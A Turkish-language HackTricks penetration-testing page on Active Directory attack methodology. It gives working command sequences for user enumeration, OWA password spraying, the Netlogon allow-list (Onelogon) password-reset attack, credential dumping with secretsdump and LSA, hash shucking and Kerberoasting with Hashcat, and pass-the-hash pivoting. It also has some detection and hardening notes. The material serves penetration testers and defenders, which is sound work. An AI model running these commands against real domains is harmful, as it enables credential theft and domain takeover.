# Active Directory Methodology

{{#include ../../banners/hacktricks-training.md}}

## Temel genel bakış

**Active Directory**, **ağ yöneticilerinin** bir ağ içindeki **etki alanlarını**, **kullanıcıları** ve **nesneleri** verimli biçimde oluşturup yönetmesini sağlayan temel bir teknolojidir. Ölçeklenebilir olacak şekilde tasarlanmıştır; çok sayıda kullanıcının yönetilebilir **gruplar** ve **alt gruplar** hâlinde düzenlenmesini sağlarken farklı düzeylerdeki **erişim haklarını** denetler.

**Active Directory** yapısı üç temel katmandan oluşur: **etki alanları**, **ağaçlar** ve **ormanlar**. Bir **etki alanı**, ortak bir veritabanını paylaşan **kullanıcılar** veya **cihazlar** gibi nesnelerden oluşur. **Ağaçlar**, ortak bir yapı üzerinden birbirine bağlı etki alanı gruplarıdır. **Orman** ise **güven ilişkileri** aracılığıyla birbirine bağlanmış birden fazla ağacın oluşturduğu koleksiyondur ve kurumsal yapının en üst katmanını temsil eder. Bu katmanların her birinde belirli **erişim** ve **iletişim hakları** tanımlanabilir.

**Active Directory** içindeki temel kavramlar şunlardır:

1. **Dizin** – Active Directory nesnelerine ilişkin tüm bilgileri barındırır.
2. **Nesne** – Dizin içindeki **kullanıcılar**, **gruplar** veya **paylaşılan klasörler** gibi varlıkları ifade eder.
3. **Etki alanı** – Dizin nesneleri için bir kapsayıcı görevi görür. Bir **orman** içinde, her biri kendi nesne koleksiyonunu koruyan birden fazla etki alanı bulunabilir.
4. **Ağaç** – Ortak bir kök etki alanını paylaşan etki alanlarının gruplandırılmasıdır.
5. **Orman** – Active Directory’deki kurumsal yapının en üst düzeyidir; aralarında **güven ilişkileri** bulunan birkaç ağaçtan oluşur.

**Active Directory Domain Services (AD DS)**, bir ağ içindeki merkezi yönetim ve iletişim için kritik öneme sahip çeşitli hizmetleri kapsar. Bu hizmetler şunlardır:

1. **Etki Alanı Hizmetleri** – Verileri merkezileştirir ve **kimlik doğrulama** ile **arama** işlevleri dâhil olmak üzere **kullanıcılar** ve **etki alanları** arasındaki etkileşimleri yönetir.
2. **Sertifika Hizmetleri** – Güvenli **dijital sertifikaların** oluşturulmasını, dağıtılmasını ve yönetilmesini sağlar.
3. **Hafif Dizin Hizmetleri** – **LDAP protokolü** üzerinden dizin özellikli uygulamaları destekler.
4. **Dizin Federasyonu Hizmetleri** – Kullanıcıların tek bir oturumda birden fazla web uygulamasında kimlik doğrulaması yapabilmesi için **single-sign-on** özellikleri sunar.
5. **Hak Yönetimi** – Telif hakkıyla korunan materyallerin izinsiz dağıtımını ve kullanımını denetleyerek korunmasına yardımcı olur.
6. **DNS Hizmeti** – **Etki alanı adlarının** çözümlenmesi için kritik öneme sahiptir.

Daha ayrıntılı bir açıklama için şu kaynağa bakın: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Kimlik Doğrulaması**

Bir **AD’ye saldırmayı** öğrenmek için **Kerberos kimlik doğrulama sürecini** çok iyi **anlamanız** gerekir.\
[**Nasıl çalıştığını hâlâ bilmiyorsanız bu sayfayı okuyun.**](kerberos-authentication.md)

## Başvuru Notları

Bir AD’yi numaralandırmak/istismar etmek için çalıştırabileceğiniz komutları hızlıca görmek üzere [https://wadcoms.github.io/](https://wadcoms.github.io) sitesine göz atabilirsiniz.

> [!WARNING]
> Kerberos iletişimi, istemcinin doğru SPN için bilet alabilmesi amacıyla normalde **tam etki alanı adı (FQDN)** gerektirir. Bir makineye IP adresiyle erişildiğinde çoğunlukla Kerberos yerine NTLM kullanılır.

## Active Directory Keşfi (Kimlik bilgileri/oturumlar olmadan)

Bir AD ortamına erişiminiz varsa ancak herhangi bir kimlik bilginiz/oturumunuz yoksa şunları yapabilirsiniz:

- **Ağı pentest edin:**
  - Ağı tarayın, makineleri ve açık portları bulun; ardından **güvenlik açıklarını istismar etmeye** veya bu makinelerden **kimlik bilgilerini çıkarmaya** çalışın (örneğin, [printers can be very interesting targets](ad-information-in-printers.md)).
  - DNS’yi numaralandırmak; etki alanındaki web, yazıcı, paylaşım, VPN, medya vb. temel sunucular hakkında bilgi verebilir.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Bunun nasıl yapılacağı hakkında daha fazla bilgi için genel [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) sayfasına göz atın.
- **SMB hizmetlerinde null ve Guest erişimini kontrol edin** (modern Windows sürümlerinde işe yaramaz):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Bir SMB sunucusunun nasıl numaralandırılacağına ilişkin daha ayrıntılı bir kılavuzu burada bulabilirsiniz:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP’yi numaralandırın**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP’nin nasıl numaralandırılacağına ilişkin daha ayrıntılı bir kılavuzu burada bulabilirsiniz (**anonim erişime** özellikle dikkat edin):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Ağı zehirleyin**
  - [**Responder ile hizmetleri taklit ederek**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) kimlik bilgileri toplayın.
  - [**relay attack yöntemini kötüye kullanarak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ana bilgisayara erişin.
  - [**evil-S ile sahte UPnP hizmetlerini açığa çıkararak**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) kimlik bilgileri toplayın.
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Etki alanı ortamları içindeki şirket içi belgelerden, sosyal medyadan ve hizmetlerden (özellikle web hizmetlerinden) ve ayrıca herkese açık kaynaklardan kullanıcı adlarını/adları çıkarın.
  - Şirket çalışanlarının tam adlarını bulursanız farklı AD **kullanıcı adı kurallarını (**[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)) deneyebilirsiniz. En yaygın kurallar şunlardır: _AdSoyad_, _Ad.Soyad_, _AdSoy_ (her birinden 3 harf), _Ad.Soy_, _ASoyad_, _A.Soyad_, _SoyadAd_, _Soyad.Ad_, _SoyadA_, _Soyad.A_, 3 _rastgele harf ve 3 rastgele sayı_ (abc123).
  - Araçlar:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Kullanıcı numaralandırması

- **Anonim SMB/LDAP numaralandırması:** [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) ve [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) sayfalarına bakın.
- **Kerbrute numaralandırması**: **Geçersiz bir kullanıcı adı istendiğinde** sunucu _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ **Kerberos hata koduyla** yanıt verir; böylece kullanıcı adının geçersiz olduğunu belirleyebiliriz. **Geçerli kullanıcı adları** ise ya bir AS-REP yanıtında **TGT** ya da _KRB5KDC_ERR_PREAUTH_REQUIRED_ hatasını döndürür. Bu hata, kullanıcının ön kimlik doğrulaması yapması gerektiğini belirtir.
- **MS-NRPC’ye kimlik doğrulaması yapmadan erişim**: Etki alanı denetleyicilerindeki MS-NRPC (Netlogon) arayüzüne karşı auth-level = 1 (Kimlik doğrulaması yok) kullanılır. Bu yöntem, MS-NRPC arayüzüne bağlandıktan sonra herhangi bir kimlik bilgisi olmadan kullanıcının veya bilgisayarın var olup olmadığını kontrol etmek için `DsrGetDcNameEx2` işlevini çağırır. [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) aracı bu tür numaralandırmayı uygular. Araştırmaya [buradan](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> ulaşabilirsiniz.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Sunucusu**

Ağda bu sunuculardan birini bulduysanız, ona karşı **user enumeration** da gerçekleştirebilirsiniz. Örneğin, [**MailSniper**](https://github.com/dafthack/MailSniper) aracını kullanabilirsiniz:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Kullanıcı adlarının listelerini [**bu github reposunda**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) ve şurada ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) bulabilirsiniz.
>
> Ancak, öncesinde gerçekleştirmeniz gereken recon adımında şirkette çalışan kişilerin **adlarını** öğrenmiş olmanız gerekir. Ad ve soyad bilgileriyle, olası geçerli kullanıcı adları oluşturmak için [**namemash.py**](https://gist.github.com/superkojiman/11076951) script'ini kullanabilirsiniz.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

**Zerologon** DC üzerinde yamalanmış olsa bile, açıkça izin listesine alınmış hesaplar hâlâ **legacy/vulnerable Netlogon güvenli kanal davranışına** maruz kalabilir. Riskli yapılandırma, **`Domain controller: Allow vulnerable Netlogon secure channel connections`** GPO'su veya buna karşılık gelen **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** registry değeridir.

Bu değer bir **SDDL güvenlik tanımlayıcısıdır** ([Security Descriptors](security-descriptors.md) bölümüne bakın). DACL'de ilgili ACE'ye sahip her hesap veya grup hedef alınabilir. Örneğin, `O:BAG:BAD:(A;;RC;;;WD)` ifadesi **Everyone** grubunu etkili biçimde izin listesine alır.

Operatörler için uygulamalı iş akışı:

1. **SYSVOL/GPO** ve **canlı DC registry**'yi kontrol ederek izin listesine alınmış principal'ları belirleyin.
2. SDDL'de bulunan SID'leri gerçek AD kullanıcılarına/bilgisayarlarına eşleyin ve **DC machine account**'larına, **trust account**'larına ve diğer ayrıcalıklı makinelere öncelik verin.
3. İzin listesine alınmış hesap olarak **MS-NRPC / Netlogon authentication**'ı tekrar tekrar deneyin.
4. Başarılı bir tahminin ardından, hedef hesabın parolasını sıfırlamak için **Netlogon password-setting** özelliğini kötüye kullanın (herkese açık PoC parolayı boş bir string olarak ayarlar).<sup>[[9]](#references)[[10]](#references)</sup>

Hızlı triage / herkese açık artifact'ten alınan lab örnekleri:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notlar:

- **scanner** kullanışlıdır; çünkü etkili allow-list **SYSVOL**'de, **registry**'de veya her ikisinde de bulunabilir.
- Güvenlik açığı bulunan bir hesap belirlendikten sonra exploit yolu **Domain Admin privileges** gerektirmediği için önemlidir.
- **DC$** gibi bir **Domain Controller machine account**'un ele geçirilmesi özellikle tehlikelidir; bu hesabın parolasını sıfırlamak doğrudan daha geniş kapsamlı **AD takeover** yollarını etkinleştirebilir.
- **Brute-force** uygulanabilirliği kullanılan moda bağlıdır: herkese açık artifact, meet-in-the-middle yaklaşımını, başka bir computer account mevcutsa **24-bit** brute force'u ve daha yavaş **32-bit** varyantları açıklar.

Tespit / hardening notları:

- Allow-list politikasını denetleyin ve geçici, açıkça gerekli uyumluluk istisnaları dışındaki her şeyi kaldırın.
- Güvenlik açığı bulunan Netlogon bağlantılarının engellendiğini, keşfedildiğini veya politika gereği açıkça izin verildiğini tespit etmek için DC **System** olayları **5827/5828/5829/5830/5831**'i izleyin.
- Eski bağımlılık kaldırılana kadar `VulnerableChannelAllowList` içindeki hesapları **yüksek riskli** kabul edin.

### Bir veya birkaç kullanıcı adını bilmek

Peki, geçerli bir kullanıcı adınız olduğunu biliyorsunuz ama parolanız yok... O halde şunları deneyin:

- [**ASREPRoast**](asreproast.md): Bir kullanıcıda _DONT_REQ_PREAUTH_ özniteliği **yoksa**, o kullanıcı için parolanın türetilmiş bir değeriyle şifrelenmiş veriler içeren bir **AS_REP mesajı isteyebilirsiniz**.
- [**Password Spraying**](password-spraying.md): Bulunan her kullanıcıda en **yaygın parolaları** deneyin; belki bir kullanıcı zayıf bir parola kullanıyordur (parola politikasını unutmayın!).
  - Kullanıcıların posta sunucularına erişmeyi denemek için **OWA sunucularına da spray** uygulayabileceğinizi unutmayın.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

**Ağ** protokollerinden bazılarına **poisoning** uygulayarak kırmak üzere bazı challenge **hash'leri elde edebilirsiniz**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration; kullanıcı adlarını, e-posta tanımlayıcılarını ve adlandırma kalıplarını, olası hedef host'ları ve kimlik doğrulamaya zorlanabilecek servisleri sağlar. Bu bağlamı kullanarak uygulanabilir NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) ve AD ortamına yönelik olası yolları belirleyin.

### NetExec workspace ile recon ve relay duruşu kontrolleri

- Etkileşim başına AD recon durumunu korumak için **`nxcdb` workspaces** kullanın: `workspace create <name>` komutu `~/.nxc/workspaces/<name>` altında protokol başına SQLite DB'leri (smb/mssql/winrm/ldap vb.) oluşturur. `proto smb|mssql|winrm` ile görünümler arasında geçiş yapın ve toplanan sırları `creds` ile listeleyin. İşiniz bittiğinde hassas verileri elle silin: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** ile alt ağı hızlıca keşfetmek **domain**, **OS build**, **SMB signing gereksinimleri** ve **Null Auth** bilgilerini gösterir. `(signing:False)` gösteren üyeler **relay saldırılarına açıktır**; DC'ler ise genellikle signing gerektirir.
- Hedeflemeyi kolaylaştırmak için NetExec çıktısından doğrudan **/etc/hosts** içinde hostname'ler oluşturun:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- **SMB relay to the DC engelleniyorsa** signing nedeniyle, yine de **LDAP** güvenlik duruşunu kontrol edin: `netexec ldap <dc>`, `(signing:None)` / zayıf channel binding değerlerini gösterir. SMB signing zorunlu olan ancak LDAP signing devre dışı bırakılmış bir DC, **SPN-less RBCD** gibi suistimaller için hâlâ kullanılabilir bir **relay-to-LDAP** hedefidir.

### İstemci tarafındaki yazıcı kimlik bilgisi sızıntıları → toplu etki alanı kimlik bilgisi doğrulama

- Yazıcı/web arayüzleri bazen **maskelenmiş yönetici parolalarını HTML içine gömer**. Kaynağı/devtools’u görüntülemek parolanın açık metnini ortaya çıkarabilir (ör. `<input value="<password>">`); bu da Basic-auth ile erişilebilen tarama/yazdırma depolarına erişim sağlar.
- Alınan yazdırma işleri, kullanıcı başına parolalar içeren **açık metin onboarding belgeleri** barındırabilir. Test ederken eşleşmeleri koruyun:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM Kimlik Bilgilerini Çalma

**null veya guest kullanıcısıyla** **diğer PC’lere veya paylaşımlara erişebiliyorsanız**, bir şekilde erişildiğinde size karşı NTLM kimlik doğrulamasını tetik**leyecek** dosyalar (SCF dosyası gibi) **yerleştirebilir**, böylece kırmak için **NTLM challenge’ını** **çalabilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking ve NT-Candidate Saldırıları

**Hash shucking**, elinizde bulunan her NT hash’ini, anahtar malzemesi doğrudan NT hash’inden türetilen daha yavaş biçimlerde aday parola olarak kullanır. Kerberos RC4 ticket’larında, NetNTLM challenge’larında veya önbelleğe alınmış kimlik bilgileri üzerinde uzun parolaları brute-force etmek yerine NT hash’lerini Hashcat’in NT-candidate modlarına verirsiniz; böylece plaintext’i hiçbir zaman öğrenmeden parola tekrar kullanımını doğrulatabilirsiniz. Bu yöntem, binlerce güncel ve geçmiş NT hash’ini toplayabileceğiniz bir domain compromise sonrasında özellikle etkilidir.<sup>[[5]](#references)</sup>

Şu durumlarda shucking kullanın:

- DCSync, SAM/SECURITY dökümleri veya kimlik bilgisi kasalarından elde ettiğiniz bir NT hash koleksiyonunuz varsa ve diğer domain/forest’larda tekrar kullanımını sınamanız gerekiyorsa.
- RC4 tabanlı Kerberos materyali (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM yanıtları veya DCC/DCC2 blob’ları yakalarsanız.
- Uzun, kırılamayan parolaların tekrar kullanımını hızla kanıtlamak ve hemen Pass-the-Hash ile ilerlemek istiyorsanız.

Bu teknik, anahtarları NT hash’i olmayan şifreleme türlerinde **işe yaramaz** (ör. Kerberos etype 17/18 AES). Bir domain yalnızca AES kullanımını zorunlu kılıyorsa normal parola modlarına dönmeniz gerekir.

#### NT hash koleksiyonu oluşturma

- **DCSync/NTDS** – Mümkün olan en geniş NT hash kümesini (önceki değerleri de dahil) almak için geçmiş değerleri içeren `secretsdump.py` kullanın:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  History kayıtları, Microsoft hesap başına en fazla 24 önceki hash'i saklayabildiğinden aday havuzunu önemli ölçüde genişletir. NTDS secrets toplamanın diğer yolları için bkz.:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dökümleri** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (veya Mimikatz `lsadump::sam /patch`), yerel SAM/SECURITY verilerini ve önbelleğe alınmış domain logon'larını (DCC/DCC2) çıkarır. Yinelenenleri kaldırın ve bu hash'leri aynı `nt_candidates.txt` listesine ekleyin.
- **Metadata'yı izleyin** – Her hash'i üreten username/domain bilgisini saklayın (wordlist yalnızca hex içerse bile). Hashcat kazanan adayı yazdırdığında eşleşen hash'ler, hangi principal'ın parolayı yeniden kullandığını hemen gösterir.
- Shucking sırasında örtüşme olasılığını en üst düzeye çıkarmak için aynı forest'taki veya güvenilen bir forest'taki adayları tercih edin.

#### Hashcat NT-candidate modları

| Hash Türü                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notlar:

- NT-candidate girdileri **ham 32-hex NT hash'leri olarak kalmalıdır**. Rule engine'lerini devre dışı bırakın (`-r` kullanmayın, hybrid mode kullanmayın); çünkü mangling, aday anahtar materyalini bozar.
- Bu modlar doğaları gereği daha hızlı değildir; ancak NTLM keyspace'i (~30,000 MH/s on an M3 Max), Kerberos RC4'ten (~300 MH/s) yaklaşık 100× daha hızlıdır. Seçilmiş bir NT listesini test etmek, yavaş formatta tüm parola uzayını taramaktan çok daha ucuzdur.
- Her zaman **en güncel Hashcat build'ini** çalıştırın (`git clone https://github.com/hashcat/hashcat && make install`); çünkü 31500/31600/35300/35400 modları yakın zamanda eklendi.<sup>[[7]](#references)</sup>
- Şu anda AS-REQ Pre-Auth için NT modu yoktur ve AES etype'ları (19600/19700), anahtarları ham NT hash'lerinden değil UTF-16LE parolalardan PBKDF2 aracılığıyla türetildiği için düz metin parola gerektirir.

#### Örnek – Kerberoast RC4 (mode 35300)

1. Düşük ayrıcalıklı bir kullanıcıyla hedef SPN için bir RC4 TGS yakalayın (ayrıntılar için Kerberoast sayfasına bakın):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. NT listenizle ticket'ı shuck edin:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat, her NT adayından RC4 anahtarını türetir ve `$krb5tgs$23$...` blob’unu doğrular. Eşleşme, servis hesabının mevcut NT hash’lerinizden birini kullandığını doğrular.

3. PtH üzerinden hemen pivot edin:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Gerekirse daha sonra `hashcat -m 1000 <matched_hash> wordlists/` ile düz metni kurtarabilirsiniz.

#### Örnek – Önbelleğe alınmış kimlik bilgileri (mode 31600)

1. Ele geçirilmiş bir iş istasyonundan önbelleğe alınmış oturum açma bilgilerini dökün:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. İlgi çekici domain kullanıcısına ait DCC2 satırını `dcc2_highpriv.txt` dosyasına kopyalayın ve shuck edin:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Başarılı bir eşleşme, listenizde zaten bildiğiniz NT hash değerini verir ve önbelleğe alınmış kullanıcının aynı parolayı yeniden kullandığını kanıtlar. Bu değeri doğrudan PtH için kullanın (`nxc smb <dc_ip> -u highpriv -H <hash>`) veya parolayı bulmak için hızlı NTLM modunda brute-force uygulayın.

Aynı iş akışı NetNTLM challenge-response değerleri (`-m 27000/27100`) ve DCC (`-m 31500`) için de geçerlidir. Eşleşme bulduğunuzda relay, SMB/WMI/WinRM PtH başlatabilir veya NT hash değerini mask/rule kullanarak çevrimdışı olarak yeniden crack edebilirsiniz.



## Kimlik bilgileri/oturumla Active Directory enumerasyonu

Bu aşama için **geçerli bir domain hesabının kimlik bilgilerini veya oturumunu ele geçirmiş olmanız gerekir.** Geçerli kimlik bilgileriniz veya bir domain kullanıcısı olarak shell erişiminiz varsa, **daha önce verilen seçeneklerin diğer kullanıcıları ele geçirmek için hâlâ kullanılabileceğini unutmayın**.

Kimliği doğrulanmış enumerasyona başlamadan önce **Kerberos double-hop sorununu** anlayın.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Bir hesabı ele geçirmek, **domain'i değerlendirmeye yönelik önemli bir adımdır**; çünkü kimliği doğrulanmış **Active Directory enumerasyonu** yapmanızı sağlar:

[**ASREPRoast**](asreproast.md) kapsamında artık savunmasız olabilecek tüm kullanıcıları bulabilir; [**Password Spraying**](password-spraying.md) kapsamında ise **tüm kullanıcı adlarının listesini** alıp ele geçirdiğiniz hesabın parolasını, boş parolaları ve yeni olası parolaları deneyebilirsiniz.

- Temel bir keşif yapmak için [**CMD kullanabilirsiniz**](../basic-cmd-for-pentesters.md#domain-info)
- Daha gizli olması için [**keşifte PowerShell de kullanabilirsiniz**](../basic-powershell-for-pentesters/index.html)
- Daha ayrıntılı bilgi almak için [**powerview kullanabilirsiniz**](../basic-powershell-for-pentesters/powerview.md)
- Active Directory'de keşif için bir diğer harika araç [**BloodHound**](bloodhound.md)'dur. **Kullandığınız toplama yöntemine bağlı olarak pek gizli değildir**; ancak **bunu önemsemiyorsanız** mutlaka deneyin. Kullanıcıların nerelere RDP yapabildiğini, diğer gruplara giden yolları vb. bulun.
  - **Diğer otomatik AD enumerasyon araçları:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- İlginç bilgiler içerebilecek [**AD'nin DNS kayıtlarını**](ad-dns-records.md) inceleyin.
- Dizini enumerate etmek için kullanabileceğiniz **GUI'li bir araç**, **SysInternal** Suite içindeki **AdExplorer.exe**'dir.
- **ldapsearch** ile LDAP veritabanında arama yaparak _userPassword_ ve _unixUserPassword_ alanlarında veya kullanıcıların _description_ ve _info_ notlarında kimlik bilgilerini arayabilirsiniz. _info_ alanındaki, etiketsiz ve parola biçimindeki bir dize yalnızca bir adaydır: amacını ve geçerliliğini ayrıca doğrulayın, rutin enumerasyon çıktısına notların içeriğini dahil etmeyin. Diğer yöntemler için PayloadsAllTheThings'teki [AD kullanıcı yorumundaki parola](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) sayfasına bakın.
- Yetkiniz varsa, `\\<dc>\NETLOGON` veya `\\<dc>\SYSVOL\<domain>\scripts` altındaki **erişilebilir** domain oturum açma ve sürücü eşleme scriptlerini inceleyin. [Microsoft belgeleri](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller), NETLOGON paylaşımının script dizini işlevini açıklar. Önce dosya adlarını listeleyin, ardından yalnızca ilgili ve okunabilir scriptleri boyut sınırı içinde inceleyin; paylaşımın tamamını dökmeyin veya rutin enumerasyon sırasında kimlik bilgisi değerlerini ekrana yazdırmayın. [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) PowerShell çağrısı, scriptte saklanan düz metin parolayı **korumaz**. Bu çağrı tek başına bir sırrın sabit kodlandığını kanıtlamaz: gerçek girdisini izleyin, ardından hesabı, kimlik bilgilerinin geçerliliğini ve ayrıcalıkları ayrıca doğrulayın. Bir domain scriptini incelemek, uzak paylaşım incelemesidir ve yerel host enumerasyonundan farklıdır.
- **Linux** kullanıyorsanız, [**pywerview**](https://github.com/the-useless-one/pywerview) ile de domain'i enumerate edebilirsiniz.
- Şu otomatik araçları da deneyebilirsiniz:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Tüm domain kullanıcılarını çıkarma**

  Windows'tan tüm domain kullanıcı adlarını almak çok kolaydır (`net user /domain` ,`Get-DomainUser` veya `wmic useraccount get name,sid`). Linux'ta şunları kullanabilirsiniz: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` veya `enum4linux -a -u "user" -p "password" <DC IP>`

> Bu Enumeration bölümü kısa görünse bile en önemli kısımdır. Bağlantılara (özellikle CMD, PowerShell, powerview ve BloodHound bağlantılarına) göz atın, bir domain'i nasıl enumerate edeceğinizi öğrenin ve kendinizi rahat hissedene kadar pratik yapın. Bir değerlendirme sırasında DA'ya ulaşmanın yolunu bulmak veya yapılabilecek hiçbir şey olmadığına karar vermek için belirleyici an budur.

### Öngörülebilir, önceden oluşturulmuş bilgisayar hesapları -> gMSA parola erişimi

Eski join işlemleri için hazırlanan bilgisayar hesaplarında öngörülebilir bir başlangıç parolası kalabilir. NetExec'in `pre2k` modülü, karakteristik `userAccountControl` değeri olan `4128`'i (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) belirler ve sondaki `$` işareti olmadan, bilgisayar adının küçük harfli hâlinin ilk 14 karakterini kullanarak Kerberos TGT almayı dener. Bu UAC değerini, **Pre-Windows 2000 Compatible Access** grubunda bulunmanın tek başına parolanın zayıf olduğunu kanıtladığını varsaymak yerine, adayları seçmek için kullanın.<sup>[[18]](#references)[[20]](#references)</sup>

Adayları test etmek ve başarılı TGT'leri kaydetmek için kimliği doğrulanmış LDAP enumerasyonu kullanın. `ALL=True`, testleri varsayılan `4128` filtresindeki nesnelerin dışına genişletir.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

